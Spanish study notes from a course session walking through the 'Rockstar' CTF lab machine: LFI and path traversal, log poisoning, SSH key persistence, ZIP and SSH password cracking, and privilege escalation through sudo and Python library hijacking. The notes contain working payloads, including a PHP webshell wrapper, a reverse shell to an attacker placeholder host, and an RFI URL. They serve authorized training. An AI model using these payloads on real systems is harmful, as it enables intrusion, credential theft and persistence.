# 🐧 Rockstar — Escalada Linux y LFI

> [!info] Ficha técnica
> **Máquina:** Rockstar (The Hacking Labs) · **Instructor:** Carlos Gómez Pintado · **Fecha:** 07/07/2026
> **Cadena de usuarios:** shark → wwwveret → lusail → username3 → root
> **Técnicas:** Permisos Linux, sudo -l, hijacking, LFI / RFI / Path Traversal

---

## ① Objetivos de la sesión

- Repasar la explotación web: reconocimiento, fuzzing de directorios y de parámetros, y LFI / Path Traversal.
- Entender por qué no tiene sentido fuzzear parámetros en HTML y sí en PHP, .NET, Java o JavaScript.
- Comprender el modelo de permisos de Linux (owner/group/other, rwx y octal).
- Practicar movimiento lateral encadenado entre varios usuarios hasta root.
- Aprender cuatro técnicas de escalada de privilegios basadas en `sudo -l`.
- Introducir la teoría de Path Traversal, LFI, RFI y XXE.

---

## ② Conceptos clave

### Fuzzing de parámetros: dónde sí y dónde no

En una URL los datos se envían mediante parámetros (`?clave=valor`), concatenables con `&`. Fuzzear parámetros solo tiene sentido en ficheros cuyo código se ejecuta en el back-end.

> [!important] Regla del fuzzing de parámetros
> **HTML no se fuzzea**: es front-end, no valida contra el servidor, así que los parámetros nunca llegan al back. Sí tiene sentido en **PHP, .NET, JavaScript o Java**. En la práctica casi siempre `.php` o `.net`.

### Interacción forzada y LFI

Un **Internal Server Error** al pasar un fichero como valor de un parámetro indica comunicación con el back-end. Cuando el PHP concatena un parámetro controlado con una variable que abre/incluye un fichero, aparece un **Local File Inclusion (LFI)**.

### Shell estabilizada vs. no estabilizada

Una shell por SSH viene **estabilizada** (cualquier comando, editores, TTY completo). Una reverse shell típica llega **no estabilizada**. Tras el acceso, interesa migrar a una shell mejor.

### El modelo de permisos de Linux

En `ls -la`, el primer carácter indica el tipo (`-` fichero, `d` directorio, `l` enlace, `s` SUID/SGID). Los nueve siguientes son tres tríos:

| Trío | Significado |
|------|-------------|
| **Owner** | Propietario |
| **Group** | Grupo (por defecto owner = group) |
| **Other** | Los demás |

Orden siempre `r w x`. En binario: `r = 4`, `w = 2`, `x = 1`; se suman por trío. Máximo = 7.

> [!warning] Buenas prácticas de permisos
> `777` es una aberración: todos los permisos a todos. Óptimo suele ser `755`. En sistemas viejos con varios administradores es común encontrar permisos mal puestos por comodidad.

---

## ③ Desarrollo técnico — recorrido de Rockstar

### 3.1 Descubrimiento y acceso inicial

```bash
sudo netdiscover -r 10.0.2.0/24
nmap -sV -sC 10.0.2.9
```

Aparecen 22 (SSH) y 80 (HTTP). Se empieza por el 80. La web no muestra nada útil → enumeración con dirsearch añadiendo extensiones:

```bash
dirsearch -u http://10.0.2.9/
dirsearch -u http://10.0.2.9/ -x php,html
```

> [!tip] Variantes de enumeración (HackTricks)
> ```bash
> sudo arp-scan -l
> nmap -sn 10.0.2.0/24
> gobuster dir -u http://10.0.2.9/ -w /usr/share/wordlists/dirb/common.txt -x php,html
> feroxbuster -u http://10.0.2.9/ -x php,html
> ffuf -u http://10.0.2.9/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html
> whatweb http://10.0.2.9/
> nikto -h http://10.0.2.9/
> ```

### 3.2 LFI y Path Traversal sobre index.php

Con `curl` sobre `index.php` salía Internal Server Error (el back respondía). Se buscó un parámetro oculto con un fuzzer propio:

```bash
curl -i http://10.0.2.9/index.php
curl -i -X POST --data 'FUZZ' http://10.0.2.9/index.php
```

> [!warning] LFI + Path Traversal confirmados
> El parámetro permitía indicar un fichero (p. ej. `db.php`) que la app leía/ejecutaba → LFI. Con `../../` se confirmó Path Traversal y lectura arbitraria (p. ej. `/etc/passwd`).

Con `/etc/passwd` se enumeran usuarios. Los `nologin` no autentican; interesan los que tienen `/bin/bash`. Varios usuarios con login → la máquina exige **movimiento lateral** antes de root.

> [!tip] Variantes de LFI / Path Traversal (HackTricks)
> ```bash
> # Descubrir parámetro con ffuf
> ffuf -u 'http://10.0.2.9/index.php?FUZZ=/etc/passwd' -w burp-parameter-names.txt -fs 0
>
> # Fuzzing de LFI con wfuzz
> wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 0 'http://10.0.2.9/index.php?file=FUZZ'
>
> # Con x8
> x8 -u http://10.0.2.9/index.php -w /usr/share/wordlists/dirb/common.txt
> ```
>
> **Parámetros candidatos habituales:** `file`, `page`, `path`, `include`, `document`, `folder`, `doc`, `view`, `cat`, `dir`
>
> **Payloads de traversal:**
> ```
> ../../../../etc/passwd
> ....//....//....//etc/passwd
> ..%2f..%2f..%2f..%2fetc%2fpasswd
> /etc/passwd%00
> ```

> [!info] Wrappers PHP (HackTricks)
> `php://filter` no ejecuta, solo revela la fuente en base64; `data:///php://input` requieren `allow_url_include=On`.
> ```
> php://filter/convert.base64-encode/resource=index.php
> php://filter/read=string.rot13/resource=index.php
> data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
> ```

> [!warning] Escalar el LFI a ejecución
> **LFI → RCE por log poisoning:** inyectar `<?php system($_GET['c']); ?>` en un campo reflejado en un log (User-Agent → access.log) y luego incluir el log vía LFI.
> ```bash
> curl -A '<?php system($_GET["c"]); ?>' http://10.0.2.9/
> http://10.0.2.9/index.php?file=/var/log/apache2/access.log&c=id
> ```
> En Rockstar no hizo falta: con las credenciales de `db.php` ya se entró por SSH.

### 3.3 Acceso por SSH y persistencia con clave RSA

```bash
ssh shark@10.0.2.9
ssh-keygen
ssh -i id_rsa shark@10.0.2.9
```

> [!tip] Persistencia por clave
> `.ssh` es carpeta oculta (empieza por punto). Guardar ahí una clave pública propia = persistencia robusta sin depender de una shell inestable.

### 3.4 Enumeración tras cada acceso

Tras cada usuario: además de `whoami` y `pwd`, un `uname -a` para la versión del kernel (muchos 0-days de escalada dependen de ella).

```bash
whoami
pwd
uname -a
sudo -l
```

> [!warning] Cuándo NO sirve el exploit de kernel
> En Rockstar el kernel estaba parcheado (2025) frente a exploits de 2026 → vía kernel descartada. Se pasa a `sudo -l`.

> [!tip] Enumeración automática (HackTricks)
> ```bash
> python3 -m http.server 8000 # en la máquina atacante
> wget http://ATACANTE:8000/linpeas.sh -O /tmp/linpeas.sh
> chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
> find / -perm -4000 2>/dev/null # buscar binarios SUID
> ```

---

## ④ Cuatro técnicas de escalada / movimiento lateral

> [!important] Regla de oro
> **Escritura + ejecución** sobre un fichero que puedes ejecutar como otro usuario (vía `sudo -l`) = **escalada**.

### Técnica 1 — Binario ejecutable escribible (shark → wwwveret)

`sudo -l`: shark puede ejecutar `bob` como `wwwveret`. `bob` es un ELF de 32 bits compilado, pero shark tiene **escritura** sobre él. En vez de un buffer overflow, se sobrescribe por bash y se ejecuta suplantando:

```bash
ls -la bob
file bob
sha1sum bob
echo 'bash' > bob
sudo -u wwwveret /home/shark/bob
```

> [!warning] Impersonación vía binario escribible
> Al ejecutar `bash` suplantando a `wwwveret`, la shell es de `wwwveret`. Mismo concepto que un cron que ejecuta un `.py` como root: si modificas el `.py`, la shell es de root.

> [!tip] Variantes GTFOBins / reverse shell
> ```bash
> echo 'bash -i >& /dev/tcp/ATACANTE/4444 0>&1' > bob
> sudo -u wwwveret find . -exec /bin/sh \; -quit
> sudo -u wwwveret awk 'BEGIN {system("/bin/sh")}'
> sudo -u wwwveret python3 -c 'import os; os.system("/bin/bash")'
> ```

### Técnica 2 — Cracking de ZIP con John (wwwveret → lusail)

Como `wwwveret` aparece `Rubiales.zip` (legible por other). Al descomprimir pide contraseña. Se extrae el hash con `zip2john` y se rompe con John + rockyou.txt:

```bash
unzip Rubiales.zip
python3 -m http.server 8000
wget http://10.0.2.9:8000/Rubiales.zip
zip2john Rubiales.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
unzip Rubiales.zip
```

> [!success] Resultado del cracking
> Contraseña recuperada: `princess` (del ZIP, no de un usuario). Dentro había `password.txt` con un listado de contraseñas.

> [!tip] Variantes de cracking de ZIP (HackTricks)
> ```bash
> fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Rubiales.zip
> hashcat -a 0 -m 13600 hashzip.txt /usr/share/wordlists/rockyou.txt
> ```

### Técnica 2b — Fuerza bruta controlada con Hydra

Con `users.txt` (4 usuarios) y `password.txt` (13 contraseñas): fuerza bruta acotada por SSH con Hydra → 4 × 13 = 52 combinaciones:

```bash
hydra -L users.txt -P password.txt ssh://10.0.2.9
```

> [!success] Credencial válida obtenida
> Hydra: `lusail` tiene contraseña válida.

> [!tip] Variantes de fuerza bruta SSH (HackTricks)
> ```bash
> medusa -h 10.0.2.9 -U users.txt -P password.txt -M ssh
> ncrack -p 22 -U users.txt -P password.txt 10.0.2.9
> netexec ssh 10.0.2.9 -u users.txt -p password.txt
> ```

### Técnica 3 — Library/PATH hijacking en Python (lusail → username3)

Como `lusail`, `sudo -l`: puede ejecutar `Rubiales.py` como `username3`. Puede leer el script pero no escribirlo. El script importa `psutil` y llama a `virtual_memory`.

**Clave:** el PATH. Python busca el import recorriendo el PATH de izquierda a derecha. Si se coloca un `psutil.py` malicioso en una ruta buscada antes que la librería real, se ejecuta el código del atacante:

```bash
cat Rubiales.py
cat psutil.py
echo 'import os' > psutil.py
echo 'os.system("bash")' >> psutil.py
sudo -u username3 /usr/bin/python3 /home/lusail/Rubiales.py
```

> [!warning] Library hijacking vía PATH
> `Rubiales.py` (como `username3`) importa el `psutil.py` del atacante y lanza bash. Como invoca `username3`, la shell es de `username3`.

> [!info] Variantes LD_PRELOAD / PATH hijacking (HackTricks)
> ```bash
> gcc -shared -fPIC -o /tmp/x.so - # código _init que lanza /bin/bash -p
> sudo LD_PRELOAD=/tmp/x.so /ruta/al/binario
> export PATH=/tmp:$PATH # con /tmp escribible y un binario falso dentro
> ```

> [!tip] Cómo se defiende esto
> Mitigaciones: ruta absoluta en el import / al invocar el intérprete, verificar el hash de la librería, o restringir escritura (DLP). Los ficheros de `/usr/bin`, `/lib`, `/etc` pertenecen a root.

### Técnica 4 — Shell como root vía sudo (username3 → root)

Como `username3`, `sudo -l` permite `/usr/bin/bsh` como root. `bsh` es una shell no estándar: sus comandos no son los de bash. En `bsh` los comandos van con `exec("...")`:

```bash
sudo /usr/bin/bsh
exec("id");
```

> [!success] Root conseguido
> No todas las shells son iguales (`bash`, `/bin/sh`, `/bin/dash`, `bsh`...): distinta sintaxis. Con `exec("id");` → root (UID 0).

---

## ⑤ Kill chain de Rockstar

```
1. Enumeración: netdiscover + nmap (22/SSH, 80/HTTP)
 ↓
2. Web: dirsearch + fuzzing de parámetro → LFI / Path Traversal en index.php
 ↓
3. Acceso inicial: credenciales de db.php → SSH como shark
 ↓
4. Lateral 1: binario 'bob' escribible + sudo -l → wwwveret
 ↓
5. Lateral 2: Rubiales.zip → zip2john + John (rockyou) / Hydra → lusail
 ↓
6. Lateral 3: hijacking de psutil.py vía PATH en Rubiales.py → username3
 ↓
7. Escalada final: sudo /usr/bin/bsh + exec("id") → ROOT
```

---

## ⑥ Herramientas utilizadas

| Herramienta | Objetivo | Fase | Nivel | Notas |
|-------------|----------|------|-------|-------|
| netdiscover | Descubrir hosts | Reconocimiento | Practicada | Alt.: arp-scan, nmap -sn |
| Nmap | Puertos y servicios | Enumeración | Recurrente | Detectó 22 y 80 |
| dirsearch | Rutas y ficheros web | Enumeración web | Practicada | Alt.: gobuster, feroxbuster, ffuf |
| curl | Peticiones HTTP | Explotación web | Practicada | Detecta ISE / LFI |
| x8 / fuzzer propio | Descubrir parámetros | Explotación web | Introducida | Alt.: ffuf, wfuzz |
| ssh / ssh-keygen | Acceso y persistencia | Acceso / Post-expl. | Practicada | Clave RSA en .ssh |
| python3 http.server | Transferir ficheros | Post-explotación | Recurrente | Con wget |
| zip2john | ZIP → hash | Cracking | Introducida | Alt.: fcrackzip |
| John the Ripper | Romper hashes | Cracking | Practicada | Recuperó 'princess' |
| Hydra | Fuerza bruta login | Acceso | Practicada | Alt.: medusa, ncrack, nxc |
| sudo -l | Listar permisos sudo | Escalada | Recurrente | El nmap de la escalada |
| bsh | Shell como root | Escalada | Introducida | Sintaxis exec(...) |

---

## ⑦ Comandos importantes

```bash
# --- Enumeración ---
sudo netdiscover -r 10.0.2.0/24
nmap -sV -sC 10.0.2.9
dirsearch -u http://10.0.2.9/ -x php,html

# --- Fuzzing / LFI ---
curl -i -X POST --data 'FUZZ' http://10.0.2.9/index.php

# --- Acceso ---
ssh -i id_rsa shark@10.0.2.9

# --- Enumeración local ---
uname -a
sudo -l

# --- Técnica 1: binario escribible ---
echo 'bash' > bob
sudo -u wwwveret /home/shark/bob

# --- Técnica 2: cracking ZIP ---
zip2john Rubiales.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# --- Técnica 2b: fuerza bruta SSH ---
hydra -L users.txt -P password.txt ssh://10.0.2.9

# --- Técnica 3: PATH hijacking ---
echo 'import os' > psutil.py
echo 'os.system("bash")' >> psutil.py
sudo -u username3 /usr/bin/python3 /home/lusail/Rubiales.py

# --- Técnica 4: root via bsh ---
sudo /usr/bin/bsh
exec("id");
```

---

## ⑧ Teoría: Path Traversal, LFI, RFI y XXE

### Path Traversal (Directory Traversal)

Permite moverse entre directorios con `../`. Si una variable que abre ficheros no está saneada, se sale de la ruta prevista hacia `/etc/passwd`, etc.

```
http://IP/index.php?file=../../../../../etc/passwd
```

> [!tip] Cuántos `../` poner
> Se pueden poner tantos como se quiera: al llegar a `/` no se retrocede más. Práctica: 9 combinaciones para asegurar la raíz.

### LFI — Local File Inclusion

Incluir/leer un fichero local al que no se debería acceder por esa función web. Suele nacer de un Path Traversal sobre `file.open(variable)`. Con wrappers PHP puede escalar a lectura de fuente o RCE.

### RFI — Remote File Inclusion

La más peligrosa: la variable hace una llamada a URL. Si no está saneada, se inyecta la URL de un servidor del atacante con una reverse shell. En PHP requiere `allow_url_include=On` (por defecto Off).

```
http://IP/index.php?file=http://ATACANTE/shell.txt
```

### XXE (adelanto)

> [!warning] Pendiente para la próxima sesión
> XXE encadena en una misma explotación LFI y Path Traversal. Se verá con una máquina de "banco".

---

## ⑨ Riesgos, errores comunes y buenas prácticas

> [!danger] Avisos
> - **No ejecutes lo que no entiendas.** `bob` simulaba un buffer overflow que no hace nada. Analiza (`file`, `sha1sum`, `cat`) y, si tienes escritura, sustituye su contenido por algo controlado.
> - **Nunca corras herramientas de hacking en la víctima:** baja el fichero a tu máquina con Python + wget. Los servidores dejan logs con la IP de quien pide.
> - **Alcance autorizado:** todas las variantes de HackTricks/GTFOBins son para laboratorios autorizados. No se aplican contra sistemas sin permiso explícito.

> [!tip] Buenas prácticas
> - Usuario de bajos privilegios y pedir la contraseña de administrador solo cuando haga falta, en vez de `chmod 777`.
> - `nologin` en `/etc/passwd` = cuenta que no inicia sesión; las cuentas de servicio casi nunca aportan. Una cuenta de usuario, aun con pocos privilegios, suele valer más.

---

## ⑩ Conexión con sesiones anteriores

- **Enumeración** (Nmap, netdiscover, dirsearch) — fase inicial recurrente; hoy se añaden gobuster/feroxbuster/ffuf como equivalentes.
- **Fuzzing de parámetros y LFI/Path Traversal** — continuación directa de la clase anterior.
- **Cracking (John) y fuerza bruta (Hydra)** — ya introducidas, ahora practicadas en CTF.
- **`python3 -m http.server` + `wget`** — patrón recurrente de transferencia.
- **Escalada por cron/tarea programada** — misma lógica que la impersonación por binario y el hijacking de librería.
- **RickdiculouslyEasy** — Hydra necesita el puerto explícito si no es el 22.

---

## ⑪ Resumen final

En la máquina Rockstar se hicieron **cuatro saltos de usuario** (shark → wwwveret → lusail → username3 → root), cada uno con una técnica de escalada apoyada en `sudo -l`: binario escribible ejecutado como otro usuario, cracking de un ZIP con John / fuerza bruta con Hydra, hijacking de librería vía PATH en un script Python, y shell personalizada como root con `exec("id")`. Se consolidó el modelo de permisos de Linux y la regla "escritura + ejecución como otro usuario = escalada". La teoría preparó el bloque web con Path Traversal, LFI, RFI y XXE.

---

## ⑫ Checklist de repaso

- [ ] Distingo en qué extensiones fuzzear parámetros (PHP/.NET/JS/Java sí, HTML no)
- [ ] Entiendo LFI y cómo un Path Traversal (`../`) lo habilita, y sé leer código con `php://filter`
- [ ] Sé leer permisos `ls -la` y convertir a octal (r=4, w=2, x=1)
- [ ] Recuerdo: escritura + ejecución como otro usuario (`sudo -l`) = escalada
- [ ] Sé ejecutar como otro usuario con `sudo -u usuario ...` y aplicar escapes de GTFOBins
- [ ] Puedo crackear un ZIP con zip2john+John, y también con fcrackzip o hashcat -m 13600
- [ ] Sé fuerza bruta SSH con Hydra y sus alternativas (medusa, ncrack, netexec)
- [ ] Entiendo library/PATH hijacking y LD_PRELOAD, y cómo mitigarlos
- [ ] Sé automatizar enumeración local con LinPEAS y buscar SUID con `find -perm -4000`
- [ ] Distingo Path Traversal, LFI, RFI y (a alto nivel) XXE

---

## ⑬ Actualización del registro de herramientas

| Herramienta | Nivel |
|-------------|-------|
| John the Ripper / Hashcat | Practicada |
| Hydra | Practicada (subida desde Introducida) |
| netdiscover | Practicada |
| dirsearch | Practicada |
| zip2john | Introducida (NUEVA) |
| fcrackzip | Mencionada (NUEVA) |
| bsh (shell personalizada) | Introducida (NUEVA) |
| ssh-keygen (persistencia RSA) | Practicada (NUEVA) |
| LinPEAS / linux-exploit-suggester / pspy | Mencionada |
| GTFOBins (find/awk/python/vim...) | Mencionada |
| medusa / ncrack / netexec | Mencionada |
| wfuzz | Mencionada |
| x8 | Mencionada |

> [!info] Bloque para memoria acumulativa
> **Técnicas nuevas:** movimiento lateral encadenado; escalada por binario escribible (sudo -l); library/PATH hijacking y name hijacking; LD_PRELOAD/LD_LIBRARY_PATH; LFI con wrappers PHP y log poisoning; RFI; XXE (adelanto).
> **Plataforma nueva:** The Hacking Labs (máquina Rockstar).

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../Apuntes_Sesion27_XXE_LFI_Nike.md|Apuntes_Sesion27_XXE_LFI_Nike]— Escalada de Privilegios, Post-Explotación, SSH
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación de Máquinas Locales I — Oopsie y Archetype.md|Explotación de Máquinas Locales I — Oopsie y Archetype]— Escalada de Privilegios, Post-Explotación, SSH
- [[../../apuntes Andres/09.07.2026 XXE - XML External Entity y Máquina Castor.md|09.07.2026 XXE - XML External Entity y Máquina Castor]— Escalada de Privilegios, RFI, SSH
- [[Explotación de Máquinas Locales I.md|Explotación de Máquinas Locales I]— Escalada de Privilegios, Post-Explotación, SSH
- [[../Apuntes_AuditoriaWeb_LFI_EscaladaLinux.md|Apuntes_AuditoriaWeb_LFI_EscaladaLinux]— Escalada de Privilegios, RFI, SSH
- [[../../Apuntes/05 - Auditoria Web/Auditoria Web — Práctica con Metasploitable.md|Auditoria Web — Práctica con Metasploitable]— GoBuster, Post-Explotación, SSH

### 🛠️ Herramientas

- [[comandos/DirSearch|DirSearch]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #command-injection #dirsearch #escalada-privilegios #feroxbuster #ffuf #gobuster #hydra #john #lfi #linux #netcat #nmap #post-explotacion #redes #reverse-shell #rfi #smb-impacket #ssh #xxe
